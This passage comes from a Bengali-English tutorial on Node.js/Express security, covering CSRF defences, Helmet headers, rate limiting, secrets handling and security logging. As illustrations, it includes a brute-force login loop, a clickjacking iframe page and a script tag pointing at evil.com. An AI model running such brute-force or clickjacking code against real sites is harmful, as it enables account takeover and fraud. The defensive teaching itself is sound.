// evil.com থেকে custom header পাঠানো যাবে না (CORS policy)
```

---

### ✅ Prevention Method 5: Origin/Referer Validation

```javascript
app.use((req, res, next) => {
    if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
        const origin = req.headers.origin || req.headers.referer;
        const allowedOrigins = [
            'https://bank.com',
            'https://www.bank.com'
        ];
        
        if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
            return res.status(403).json({ error: 'Invalid origin' });
        }
    }
    next();
});

// evil.com থেকে request এলে origin হবে evil.com
// তাই blocked হবে ✅
```

---

### ✅ Prevention Method 6: Re-authentication for Sensitive Actions

```javascript
// For critical operations, ask for password again
app.post('/delete-account', async (req, res) => {
    const { password } = req.body;
    
    // ✅ Verify password before deleting
    const user = await User.findById(req.user.id);
    const isValid = await bcrypt.compare(password, user.password);
    
    if (!isValid) {
        return res.status(401).json({ error: 'Invalid password' });
    }
    
    // Delete account
    await user.remove();
    res.json({ message: 'Account deleted' });
});

// CSRF attack হলেও password জানা নেই → Failed ✅
```

---

### Best Practices Against CSRF:

✅ **Use CSRF tokens for form submissions**  
✅ **Set SameSite=Strict for cookies**  
✅ **Use POST/PUT/DELETE for state-changing operations** (never GET)  
✅ **Validate Origin/Referer headers**  
✅ **Require re-authentication for sensitive actions**  
✅ **Use custom headers for API requests**  
✅ **Implement CORS properly**  
✅ **Don't expose CSRF tokens in URLs**  
✅ **Expire CSRF tokens after use or timeout**  
✅ **Log and monitor CSRF attempts**

---

### CSRF vs XSS:

| Aspect | CSRF | XSS |
|--------|------|-----|
| **Target** | Server-side actions | Client-side data |
| **Executes** | On server | In browser |
| **Requires** | Victim logged in | Malicious script |
| **Steals** | Performs actions | Steals data/cookies |
| **Prevention** | CSRF tokens, SameSite | Sanitization, CSP |

**Important:** XSS can bypass CSRF protection!  
If attacker can inject JavaScript (XSS), they can read CSRF token and make valid requests।

---

## ৫. Secure Headers (Helmet.js) - বিস্তারিত

HTTP headers দিয়ে browser কে বিভিন্ন security policy বলা যায়। **Helmet.js** automatically 15+ security headers সেট করে।

```bash
npm install helmet
```

```javascript
const helmet = require('helmet');

// ✅ Basic usage (recommended)
app.use(helmet());

// All এই headers automatically set হয়ে যাবে! 🛡️
```

---

### Helmet কি কি Headers সেট করে?

#### 1. Content-Security-Policy (CSP)

XSS protection - কোথা থেকে resources load করা যাবে তা নির্ধারণ করে।

```javascript
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "https://trusted-cdn.com"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "https://api.example.com"],
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"]
    }
}));

// Response Header:
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;

// ❌ এখন এই script block হবে:
// <script src="https://evil.com/malware.js"></script>
```

#### 2. X-DNS-Prefetch-Control

DNS prefetching control করে।

```javascript
app.use(helmet.dnsPrefetchControl());

// Header: X-DNS-Prefetch-Control: off
```

#### 3. X-Frame-Options

Clickjacking attack prevent করে - site টাকে iframe এ embed করা যাবে না।

```javascript
app.use(helmet.frameguard({ action: 'deny' }));

// Header: X-Frame-Options: DENY

// Options:
// 'deny' - কোনো iframe এ load হবে না
// 'sameorigin' - শুধু same origin এ
// { action: 'allow-from', domain: 'https://example.com' }
```

**Clickjacking Attack Example:**
```html
<!-- Hacker's page -->
<iframe src="https://bank.com/transfer" style="opacity: 0;">
</iframe>
<button style="position: absolute;">Click to win iPhone!</button>

<!-- Victim thinks they're clicking iPhone button
     Actually clicking hidden transfer button! -->
```

#### 4. X-Powered-By

Express ব্যবহার করছেন তা hide করে (information disclosure prevention)।

```javascript
app.use(helmet.hidePoweredBy());

// ❌ Before: X-Powered-By: Express
// ✅ After: (header removed)

// Or fake it
app.use(helmet.hidePoweredBy({ setTo: 'PHP 7.4.3' }));
// X-Powered-By: PHP 7.4.3 (misdirection!)
```

#### 5. Strict-Transport-Security (HSTS)

Browser কে force করে সবসময় HTTPS ব্যবহার করতে।

```javascript
app.use(helmet.hsts({
    maxAge: 31536000,        // 1 year in seconds
    includeSubDomains: true, // Subdomains ও include
    preload: true            // Browser preload list এ add
}));

// Header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// এখন browser সবসময় HTTPS এ redirect করবে
// HTTP request করলেও ✅
```

#### 6. X-Download-Options

IE এর unsafe file execution prevent করে।

```javascript
app.use(helmet.ieNoOpen());

// Header: X-Download-Options: noopen
```

#### 7. X-Content-Type-Options

MIME type sniffing prevent করে।

```javascript
app.use(helmet.noSniff());

// Header: X-Content-Type-Options: nosniff

// ❌ Without this:
// Browser might execute text/plain as JavaScript!

// ✅ With this:
// Browser strictly follows Content-Type
```

#### 8. X-Permitted-Cross-Domain-Policies

Adobe Flash/PDF cross-domain policies।

```javascript
app.use(helmet.permittedCrossDomainPolicies());

// Header: X-Permitted-Cross-Domain-Policies: none
```

#### 9. Referrer-Policy

কতটুকু referrer information share করবে।

```javascript
app.use(helmet.referrerPolicy({ policy: 'no-referrer' }));

// Header: Referrer-Policy: no-referrer

// Options:
// 'no-referrer' - কোনো referrer পাঠাবে না
// 'no-referrer-when-downgrade' - HTTPS→HTTP তে না
// 'same-origin' - শুধু same origin এ
// 'origin' - শুধু origin পাঠাবে (full URL না)
// 'strict-origin-when-cross-origin' (recommended)
```

#### 10. X-XSS-Protection

Browser এর built-in XSS filter enable করে।

```javascript
app.use(helmet.xssFilter());

// Header: X-XSS-Protection: 1; mode=block

// Note: Modern browsers prefer CSP over this
// But good for older browsers
```

---

### Complete Helmet Configuration:

```javascript
const helmet = require('helmet');

app.use(helmet({
    // Content Security Policy
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            baseUri: ["'self'"],
            fontSrc: ["'self'", "https:", "data:"],
            frameAncestors: ["'self'"],
            imgSrc: ["'self'", "data:"],
            objectSrc: ["'none'"],
            scriptSrc: ["'self'"],
            scriptSrcAttr: ["'none'"],
            styleSrc: ["'self'", "https:", "'unsafe-inline'"],
            upgradeInsecureRequests: []
        }
    },
    
    // Clickjacking protection
    frameguard: {
        action: 'deny'
    },
    
    // Force HTTPS
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    
    // Hide X-Powered-By
    hidePoweredBy: true,
    
    // Prevent MIME sniffing
    noSniff: true,
    
    // Referrer policy
    referrerPolicy: {
        policy: 'strict-origin-when-cross-origin'
    },
    
    // XSS Protection
    xssFilter: true
}));
```

---

### Custom Security Headers:

```javascript
// Additional custom headers
app.use((req, res, next) => {
    // Permissions Policy (formerly Feature Policy)
    res.setHeader('Permissions-Policy', 
        'geolocation=(), microphone=(), camera=()'
    );
    
    // Expect-CT (Certificate Transparency)
    res.setHeader('Expect-CT', 
        'max-age=86400, enforce'
    );
    
    // X-Robots-Tag (SEO control)
    res.setHeader('X-Robots-Tag', 
        'noindex, nofollow'
    );
    
    next();
});
```

---

### Testing Security Headers:

```bash
# Check headers
curl -I https://example.com

# Or use online tools:
# - https://securityheaders.com
# - https://observatory.mozilla.org
```

---

### Helmet Best Practices:

✅ **Always use helmet() in production**  
✅ **Configure CSP properly** (don't use 'unsafe-inline' in production)  
✅ **Enable HSTS** (after testing)  
✅ **Hide X-Powered-By**  
✅ **Test headers with securityheaders.com**  
✅ **Update helmet regularly** (new vulnerabilities discovered)  
✅ **Don't disable default protections** unless necessary  
✅ **Monitor CSP violations** (reportUri/report-to)  
✅ **Use HTTPS everywhere**

---

## ৬. Rate Limiting (DDoS & Brute Force Protection)

Rate limiting prevents:
- **DDoS attacks** (Distributed Denial of Service)
- **Brute force attacks** (password guessing)
- **API abuse** (excessive requests)
- **Web scraping**

---

### Why Rate Limiting is Critical:

**Without Rate Limiting:**
```javascript
// Attacker can make unlimited requests
for (let i = 0; i < 1000000; i++) {
    fetch('https://api.example.com/login', {
        method: 'POST',
        body: JSON.stringify({
            email: 'admin@example.com',
            password: passwords[i]  // Brute force!
        })
    });
}

// Result: 
// - Server overloaded 💥
// - Password eventually cracked 🔓
// - Legitimate users can't access 😞
```

---

### ✅ Method 1: express-rate-limit (Basic)

```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

// General API limiter
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,                  // max 100 requests per windowMs
    message: {
        status: 429,
        error: 'Too many requests, please try again later.'
    },
    standardHeaders: true,      // Return rate limit info in headers
    legacyHeaders: false,       // Disable X-RateLimit-* headers
    
    // Custom key generator (default: IP address)
    keyGenerator: (req) => {
        return req.ip;
    },
    
    // Handler when limit exceeded
    handler: (req, res) => {
        res.status(429).json({
            success: false,
            error: 'Too many requests',
            retryAfter: req.rateLimit.resetTime
        });
    },
    
    // Skip rate limiting for certain requests
    skip: (req) => {
        // Don't rate limit internal IPs
        return req.ip === '127.0.0.1';
    }
});

// Apply to all routes
app.use('/api/', apiLimiter);
```

#### Response Headers:

```
HTTP/1.1 429 Too Many Requests
RateLimit-Limit: 100
RateLimit-Remaining: 0
RateLimit-Reset: 1642771200
Retry-After: 300
```

---

### ✅ Method 2: Stricter Limits for Auth Endpoints

```javascript
// Strict limiter for login (prevent brute force)
const loginLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,   // 1 hour
    max: 5,                     // Only 5 attempts!
    skipSuccessfulRequests: true, // Don't count successful logins
    message: {
        error: 'Too many login attempts, please try again in an hour.'
    }
});

app.post('/api/login', loginLimiter, async (req, res) => {
    // Login logic...
});

// Different limits for different endpoints
const registerLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,
    max: 3  // Only 3 registrations per hour per IP
});

app.post('/api/register', registerLimiter, async (req, res) => {
    // Register logic...
});

// Password reset limiter
const passwordResetLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,
    max: 3
});

app.post('/api/forgot-password', passwordResetLimiter, async (req, res) => {
    // Password reset logic...
});
```

---

### ✅ Method 3: Rate Limiting with Redis (Production)

In production, use Redis to store rate limit data (works across multiple servers).

```bash
npm install rate-limit-redis redis
```

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('redis');

// Create Redis client
const redisClient = Redis.createClient({
    host: process.env.REDIS_HOST,
    port: process.env.REDIS_PORT
});

// Rate limiter with Redis store
const limiter = rateLimit({
    store: new RedisStore({
        client: redisClient,
        prefix: 'rate-limit:'  // Redis key prefix
    }),
    windowMs: 15 * 60 * 1000,
    max: 100
});

app.use('/api/', limiter);

// Benefits:
// ✅ Works across multiple server instances
// ✅ Persists across server restarts
// ✅ Fast lookup (Redis is in-memory)
// ✅ Automatic cleanup of old entries
```

---

### ✅ Method 4: User-Based Rate Limiting

Rate limit based on user ID (after authentication):

```javascript
const userLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    
    // ✅ Use user ID instead of IP
    keyGenerator: (req) => {
        return req.user ? req.user.id : req.ip;
    },
    
    // Skip for admin users
    skip: (req) => {
        return req.user && req.user.role === 'admin';
    }
});

app.use('/api/', authenticate, userLimiter);
```

---

### ✅ Method 5: Dynamic Rate Limits

Different limits for different user tiers:

```javascript
const dynamicLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    
    // ✅ Dynamic max based on user tier
    max: (req) => {
        if (!req.user) return 10;              // Anonymous: 10/15min
        if (req.user.tier === 'free') return 100;     // Free: 100/15min
        if (req.user.tier === 'premium') return 1000; // Premium: 1000/15min
        if (req.user.tier === 'enterprise') return 10000; // Enterprise: 10000/15min
        return 100;
    },
    
    keyGenerator: (req) => req.user?.id || req.ip
});
```

---

### ✅ Method 6: Sliding Window Rate Limiting

```bash
npm install rate-limit-flexible
```

```javascript
const { RateLimiterMemory } = require('rate-limit-flexible');

const rateLimiter = new RateLimiterMemory({
    points: 10,         // 10 requests
    duration: 60,       // per 60 seconds
    blockDuration: 300  // Block for 5 minutes if exceeded
});

const rateLimiterMiddleware = async (req, res, next) => {
    try {
        await rateLimiter.consume(req.ip);
        next();
    } catch (error) {
        res.status(429).json({
            error: 'Too many requests',
            retryAfter: Math.round(error.msBeforeNext / 1000)
        });
    }
};

app.use('/api/', rateLimiterMiddleware);
```

---

### ✅ Method 7: Distributed Rate Limiting (Microservices)

```javascript
const { RateLimiterRedis } = require('rate-limit-flexible');
const Redis = require('redis');

const redisClient = Redis.createClient({
    host: process.env.REDIS_HOST,
    port: process.env.REDIS_PORT
});

const rateLimiter = new RateLimiterRedis({
    storeClient: redisClient,
    keyPrefix: 'rl:',
    points: 100,
    duration: 60,
    
    // ✅ Works across multiple services/servers
    insuranceLimiter: new RateLimiterMemory({
        points: 100,
        duration: 60
    })
});
```

---

### Advanced Rate Limiting Strategies:

#### 1. Token Bucket Algorithm

```javascript
class TokenBucket {
    constructor(capacity, refillRate) {
        this.capacity = capacity;      // Max tokens
        this.tokens = capacity;        // Current tokens
        this.refillRate = refillRate;  // Tokens per second
        this.lastRefill = Date.now();
    }
    
    consume(tokens = 1) {
        this.refill();
        
        if (this.tokens >= tokens) {
            this.tokens -= tokens;
            return true;
        }
        return false;
    }
    
    refill() {
        const now = Date.now();
        const elapsed = (now - this.lastRefill) / 1000;
        const tokensToAdd = elapsed * this.refillRate;
        
        this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd);
        this.lastRefill = now;
    }
}

// Usage
const bucket = new TokenBucket(100, 10); // 100 capacity, refill 10/sec

app.use((req, res, next) => {
    if (bucket.consume()) {
        next();
    } else {
        res.status(429).json({ error: 'Rate limit exceeded' });
    }
});
```

#### 2. Different Limits for Different HTTP Methods

```javascript
const readLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 1000  // 1000 reads
});

const writeLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100   // Only 100 writes
});

app.get('/api/*', readLimiter);
app.post('/api/*', writeLimiter);
app.put('/api/*', writeLimiter);
app.delete('/api/*', writeLimiter);
```

#### 3. Cost-Based Rate Limiting

```javascript
const costLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 100,  // 100 points per minute
    
    // Different endpoints cost different points
    keyGenerator: (req) => req.ip,
    skip: (req) => false,
    
    // Calculate cost
    handler: (req, res) => {
        const costs = {
            '/api/search': 5,       // Expensive operation
            '/api/users': 1,        // Cheap operation
            '/api/export': 20       // Very expensive
        };
        
        const cost = costs[req.path] || 1;
        req.rateLimit.cost = cost;
    }
});
```

---

### Monitoring & Logging:

```javascript
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    
    // Log when rate limit exceeded
    handler: (req, res) => {
        console.warn(`Rate limit exceeded: ${req.ip} - ${req.path}`);
        
        // Send alert if too many violations
        if (violations[req.ip] > 10) {
            sendSecurityAlert(`Possible attack from ${req.ip}`);
        }
        
        res.status(429).json({ error: 'Too many requests' });
    }
});
```

---

### Rate Limiting Best Practices:

✅ **Always implement rate limiting in production**  
✅ **Use Redis for distributed systems**  
✅ **Stricter limits for auth endpoints** (5-10 attempts/hour)  
✅ **Different limits for different user tiers**  
✅ **Return clear error messages** (with retry-after)  
✅ **Log rate limit violations** (security monitoring)  
✅ **Whitelist trusted IPs** (your own services)  
✅ **Consider using CDN** (Cloudflare, AWS Shield)  
✅ **Implement exponential backoff** (progressive delays)  
✅ **Monitor and adjust limits** based on usage patterns

---

### Testing Rate Limiting:

```bash
# Test with curl
for i in {1..150}; do
    curl http://localhost:3000/api/users
    sleep 0.1
done

# Should see 429 after 100 requests
```

```javascript
// Test with code
for (let i = 0; i < 150; i++) {
    fetch('http://localhost:3000/api/users')
        .then(res => console.log(res.status))
        .catch(err => console.error(err));
}
```

---

## ৭. Environment Variables & Secrets Management

Hardcoding secrets in code হলো **#1 security mistake**।

### ❌ Never Do This:

```javascript
// ❌ Extremely dangerous!
const config = {
    dbPassword: 'mySecretPassword123',
    jwtSecret: 'supersecretkey',
    apiKey: 'sk_live_51H4Nfj2...',
    awsAccessKey: 'AKIAIOSFODNN7EXAMPLE'
};

// If this code goes to GitHub:
// - Bots scan for secrets within minutes
// - Your database gets hacked
// - API keys get stolen and abused
// - AWS bills go through the roof! 💸
```

---

### ✅ Method 1: dotenv (Development)

```bash
npm install dotenv
```

**Create `.env` file:**
```env
# Database
DB_HOST=localhost
DB_PORT=5432
DB_NAME=myapp
DB_USER=postgres
DB_PASSWORD=SuperSecretPassword123!

# JWT
JWT_SECRET=your-256-bit-secret-key-here-very-long-and-random
JWT_EXPIRE=7d

# API Keys
STRIPE_SECRET_KEY=sk_test_51H4Nfj2...
STRIPE_PUBLIC_KEY=pk_test_51H4Nfj2...
SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxxxx

# AWS
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_REGION=us-east-1

# App
NODE_ENV=development
PORT=3000
BASE_URL=http://localhost:3000
FRONTEND_URL=http://localhost:5173

# Email
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=your-email@gmail.com
SMTP_PASS=your-app-password

# Redis
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=redis-secret-password
```

**Load in app:**
```javascript
require('dotenv').config();

// ✅ Access via process.env
const dbConfig = {
    host: process.env.DB_HOST,
    port: process.env.DB_PORT,
    database: process.env.DB_NAME,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD
};

const jwtSecret = process.env.JWT_SECRET;
```

**Add to `.gitignore`:**
```gitignore
# Environment variables
.env
.env.local
.env.*.local

# Secrets
secrets/
*.key
*.pem
```

**Create `.env.example` for documentation:**
```env
# Copy this file to .env and fill in actual values

DB_HOST=
DB_PORT=
DB_NAME=
DB_USER=
DB_PASSWORD=

JWT_SECRET=
JWT_EXPIRE=

STRIPE_SECRET_KEY=
```

---

### ✅ Method 2: Environment-Specific Configs

```javascript
// config/database.js
module.exports = {
    development: {
        host: process.env.DB_HOST || 'localhost',
        port: process.env.DB_PORT || 5432,
        database: 'myapp_dev'
    },
    test: {
        host: process.env.DB_HOST || 'localhost',
        port: process.env.DB_PORT || 5432,
        database: 'myapp_test'
    },
    production: {
        host: process.env.DB_HOST,
        port: process.env.DB_PORT,
        database: process.env.DB_NAME,
        ssl: true,  // Require SSL in production
        pool: {
            min: 2,
            max: 10
        }
    }
};

// Usage
const env = process.env.NODE_ENV || 'development';
const dbConfig = require('./config/database')[env];
```

---

### ✅ Method 3: Validation (Fail Fast)

```bash
npm install joi
```

```javascript
const Joi = require('joi');

// Define required environment variables
const envSchema = Joi.object({
    NODE_ENV: Joi.string()
        .valid('development', 'production', 'test')
        .required(),
    
    PORT: Joi.number()
        .default(3000),
    
    DB_HOST: Joi.string()
        .required(),
    
    DB_PASSWORD: Joi.string()
        .min(8)
        .required(),
    
    JWT_SECRET: Joi.string()
        .min(32)
        .required(),
    
    STRIPE_SECRET_KEY: Joi.string()
        .pattern(/^sk_(test|live)_/)
        .required()
}).unknown();  // Allow other env vars

// Validate on startup
const { error, value: env } = envSchema.validate(process.env);

if (error) {
    console.error('❌ Invalid environment variables:', error.message);
    process.exit(1);  // Don't start if config is wrong!
}

module.exports = env;
```

---

### ✅ Method 4: Secrets Managers (Production)

#### AWS Secrets Manager:

```bash
npm install aws-sdk
```

```javascript
const AWS = require('aws-sdk');

const secretsManager = new AWS.SecretsManager({
    region: 'us-east-1'
});

async function getSecret(secretName) {
    try {
        const data = await secretsManager.getSecretValue({
            SecretId: secretName
        }).promise();
        
        return JSON.parse(data.SecretString);
    } catch (error) {
        console.error('Error fetching secret:', error);
        throw error;
    }
}

// Usage
const dbCredentials = await getSecret('prod/myapp/database');
// {
//     "host": "mydb.us-east-1.rds.amazonaws.com",
//     "username": "admin",
//     "password": "actual-secret-password"
// }
```

#### Azure Key Vault:

```bash
npm install @azure/keyvault-secrets @azure/identity
```

```javascript
const { SecretClient } = require('@azure/keyvault-secrets');
const { DefaultAzureCredential } = require('@azure/identity');

const credential = new DefaultAzureCredential();
const vaultUrl = `https://${process.env.KEY_VAULT_NAME}.vault.azure.net`;
const client = new SecretClient(vaultUrl, credential);

async function getSecret(secretName) {
    const secret = await client.getSecret(secretName);
    return secret.value;
}

const jwtSecret = await getSecret('jwt-secret');
```

#### HashiCorp Vault:

```bash
npm install node-vault
```

```javascript
const vault = require('node-vault')({
    apiVersion: 'v1',
    endpoint: process.env.VAULT_ADDR,
    token: process.env.VAULT_TOKEN
});

async function getSecret(path) {
    const result = await vault.read(path);
    return result.data;
}

const secrets = await getSecret('secret/data/myapp/database');
```

---

### ✅ Method 5: Docker Secrets

```yaml
# docker-compose.yml
version: '3.8'

services:
  app:
    image: myapp:latest
    secrets:
      - db_password
      - jwt_secret
    environment:
      DB_HOST: postgres
      DB_USER: myuser

secrets:
  db_password:
    file: ./secrets/db_password.txt
  jwt_secret:
    file: ./secrets/jwt_secret.txt
```

```javascript
// In app
const fs = require('fs');

const dbPassword = fs.readFileSync('/run/secrets/db_password', 'utf8').trim();
const jwtSecret = fs.readFileSync('/run/secrets/jwt_secret', 'utf8').trim();
```

---

### Security Best Practices for Secrets:

✅ **Never commit secrets to Git**  
✅ **Use .env files for development only**  
✅ **Use secrets managers in production** (AWS, Azure, Vault)  
✅ **Rotate secrets regularly** (every 90 days)  
✅ **Use different secrets for dev/staging/prod**  
✅ **Validate environment variables on startup**  
✅ **Encrypt secrets at rest and in transit**  
✅ **Limit access to secrets** (principle of least privilege)  
✅ **Audit secret access** (who accessed what when)  
✅ **Use service accounts, not personal credentials**  
✅ **Don't log secrets** (even accidentally)  
✅ **Use secret scanning tools** (git-secrets, truffleHog)

---

### Common Mistakes to Avoid:

```javascript
// ❌ Don't log secrets
console.log('JWT Token:', token);
console.log('Config:', process.env);  // Logs everything!

// ✅ Do this
console.log('JWT Token: [REDACTED]');
console.log('Config:', {
    port: process.env.PORT,
    env: process.env.NODE_ENV
    // Only non-sensitive values
});

// ❌ Don't send secrets to frontend
res.json({
    user: user,
    apiKey: process.env.STRIPE_SECRET_KEY  // NO!
});

// ✅ Use public keys only
res.json({
    user: user,
    stripePublicKey: process.env.STRIPE_PUBLIC_KEY  // OK
});

// ❌ Don't expose in error messages
catch (error) {
    res.json({
        error: error.message,
        config: dbConfig  // Contains password!
    });
}

// ✅ Generic error messages
catch (error) {
    console.error(error);  // Log server-side only
    res.status(500).json({
        error: 'Database connection failed'
    });
}
```

---

### Detecting Leaked Secrets:

```bash
# Install git-secrets
npm install -g git-secrets

# Scan repository
git secrets --scan

# Scan history
git secrets --scan-history

# Add patterns
git secrets --add 'password\s*=\s*.+'
git secrets --add --allowed 'password = process.env'
```

```bash
# TruffleHog - Find secrets in Git history
docker run --rm -v "$(pwd):/proj" trufflesecurity/trufflehog filesystem /proj

# Detect-secrets
pip install detect-secrets
detect-secrets scan > .secrets.baseline
```

---

### If You Accidentally Commit Secrets:

1. **Rotate immediately** - The secret is compromised!
2. **Remove from Git history** (BFG Repo-Cleaner, git filter-branch)
3. **Force push** (notify team first)
4. **Check for unauthorized access**
5. **Update secret everywhere it's used**

```bash
# Remove secret from history
bfg --replace-text passwords.txt repo.git
git push --force
```

---

## ৮. Logging & Monitoring - বিস্তারিত

"You can't protect what you can't see" - Proper logging helps detect attacks early!

---

### ✅ Method 1: Winston (Production Logging)

```bash
npm install winston
```

```javascript
const winston = require('winston');

// Create logger
const logger = winston.createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.errors({ stack: true }),
        winston.format.json()
    ),
    defaultMeta: { service: 'myapp' },
    transports: [
        // Error logs
        new winston.transports.File({
            filename: 'logs/error.log',
            level: 'error',
            maxsize: 5242880,  // 5MB
            maxFiles: 5
        }),
        
        // All logs
        new winston.transports.File({
            filename: 'logs/combined.log',
            maxsize: 5242880,
            maxFiles: 5
        })
    ]
});

// Console in development
if (process.env.NODE_ENV !== 'production') {
    logger.add(new winston.transports.Console({
        format: winston.format.simple()
    }));
}

// Usage
logger.info('Server started', { port: 3000 });
logger.warn('Rate limit exceeded', { ip: '192.168.1.1' });
logger.error('Database connection failed', { error: err.message });

module.exports = logger;
```

---

### ✅ Method 2: Morgan (HTTP Request Logging)

```bash
npm install morgan
```

```javascript
const morgan = require('morgan');
const fs = require('fs');
const path = require('path');

// Create log directory
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

// Create write stream
const accessLogStream = fs.createWriteStream(
    path.join(logDir, 'access.log'),
    { flags: 'a' }
);

// Development logging
if (process.env.NODE_ENV === 'development') {
    app.use(morgan('dev'));
    // Output: GET /api/users 200 15.234 ms - 1024
}

// Production logging
if (process.env.NODE_ENV === 'production') {
    app.use(morgan('combined', { stream: accessLogStream }));
    // Output: 192.168.1.1 - - [01/Jan/2026:12:00:00 +0000] "GET /api/users HTTP/1.1" 200 1024
}

// Custom format
morgan.token('user-id', (req) => req.user?.id || 'anonymous');

app.use(morgan(':method :url :status :response-time ms - user: :user-id'));
```

---

### Security-Focused Logging:

```javascript
// Log security events
const securityLogger = winston.createLogger({
    level: 'info',
    format: winston.format.json(),
    transports: [
        new winston.transports.File({
            filename: 'logs/security.log',
            maxsize: 5242880,
            maxFiles: 10
        })
    ]
});

// Authentication events
app.post('/login', async (req, res) => {
    const { email } = req.body;
    
    try {
        const user = await authenticateUser(req.body);
        
        securityLogger.info('Login successful', {
            event: 'LOGIN_SUCCESS',
            userId: user.id,
            email: user.email,
            ip: req.ip,
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toISOString()
        });
        
        res.json({ token: generateToken(user) });
    } catch (error) {
        securityLogger.warn('Login failed', {
            event: 'LOGIN_FAILED',
            email: email,
            reason: error.message,
            ip: req.ip,
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toISOString()
        });
        
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

// Log privilege changes
async function changeUserRole(userId, newRole, adminId) {
    securityLogger.warn('Role changed', {
        event: 'ROLE_CHANGE',
        userId: userId,
        newRole: newRole,
        changedBy: adminId,
        timestamp: new Date().toISOString()
    });
    
    // Update role...
}

// Log sensitive data access
app.get('/users/:id/private-data', authenticate, authorize('admin'), (req, res) => {
    securityLogger.info('Sensitive data accessed', {
        event: 'SENSITIVE_DATA_ACCESS',
        resource: 'private-data',
        userId: req.params.id,
        accessedBy: req.user.id,
        ip: req.ip,
        timestamp: new Date().toISOString()
    });
    
    // Return data...
});
```

---

### What to Log:

#### ✅ Do Log:

- **Authentication events** (login, logout, failed attempts)
- **Authorization failures** (access denied)
- **Input validation failures**
- **Security violations** (CSRF, XSS attempts)
- **Rate limit violations**
- **Privilege changes** (role updates)
- **Sensitive data access**
- **Configuration changes**
- **System errors**

#### ❌ Don't Log:

- **Passwords** (even hashed!)
- **Credit card numbers**
- **API keys/tokens**
- **Session IDs**
- **Personal identifiable information (PII)** in production

```javascript
// ❌ Bad
logger.info('User login', {
    email: user.email,
    password: user.password,  // NO!
    token: token              // NO!
});

// ✅ Good
logger.info('User login', {
    userId: user.id,
    email: user.email.replace(/(?<=.{2}).(?=[^@]*?.@)/g, '*'),  // ma**@example.com
    ip: req.ip
});
```

---

### Log Redaction:

```javascript
// Automatically redact sensitive data
function redactSensitive(data) {
    const sensitive = ['password', 'token', 'secret', 'apiKey', 'creditCard'];
    const redacted = { ...data };
    
    Object.keys(redacted).forEach(key => {
        if (sensitive.some(s => key.toLowerCase().includes(s))) {
            redacted[key] = '[REDACTED]';
        }
    });
    
    return redacted;
}

logger.info('Request data', redactSensitive(req.body));
```

---

### Monitoring & Alerting:

```javascript
// Alert on suspicious activity
function checkSuspiciousActivity(userId, action) {
    const recentActions = getRecentActions(userId, '5m');
    
    if (recentActions.length > 50) {
        securityLogger.error('Suspicious activity detected', {
            event: 'SUSPICIOUS_ACTIVITY',
            userId: userId,
            actionCount: recentActions.length,
            timeWindow: '5 minutes'
        });
        
        // Send alert
        sendAlertToSlack({
            text: `🚨 Suspicious activity: User ${userId} performed ${recentActions.length} actions in 5 minutes`,
            severity: 'high'
        });
        
        // Temporary account lock
        lockAccount(userId, '15 minutes');
    }
}

// Monitor error rates
let errorCount = 0;
let lastErrorCheck = Date.now();

app.use((err, req, res, next) => {
    errorCount++;
    
    if (Date.now() - lastErrorCheck > 60000) {  // 1 minute
        if (errorCount > 100) {
            logger.error('High error rate detected', {
                event: 'HIGH_ERROR_RATE',
                count: errorCount,
                timeWindow: '1 minute'
            });
            
            sendAlertToPagerDuty('High error rate: ' + errorCount + '/min');
        }
        
        errorCount = 0;
        lastErrorCheck = Date.now();
    }
    
    next(err);
});
```

---

### Centralized Logging (Production):

#### Using ELK Stack (Elasticsearch, Logstash, Kibana):

```bash
npm install winston-elasticsearch
```

```javascript
const { ElasticsearchTransport } = require('winston-elasticsearch');

const esTransport = new ElasticsearchTransport({
    level: 'info',
    clientOpts: {
        node: process.env.ELASTICSEARCH_URL,
        auth: {
            username: process.env.ES_USERNAME,
            password: process.env.ES_PASSWORD
        }
    },
    index: 'myapp-logs'
});

logger.add(esTransport);
```

#### Using Sentry (Error Tracking):

```bash
npm install @sentry/node
```

```javascript
const Sentry = require('@sentry/node');

Sentry.init({
    dsn: process.env.SENTRY_DSN,
    environment: process.env.NODE_ENV,
    tracesSampleRate: 1.0
});

// Capture errors
app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.errorHandler());

// Manual error reporting
try {
    // code...
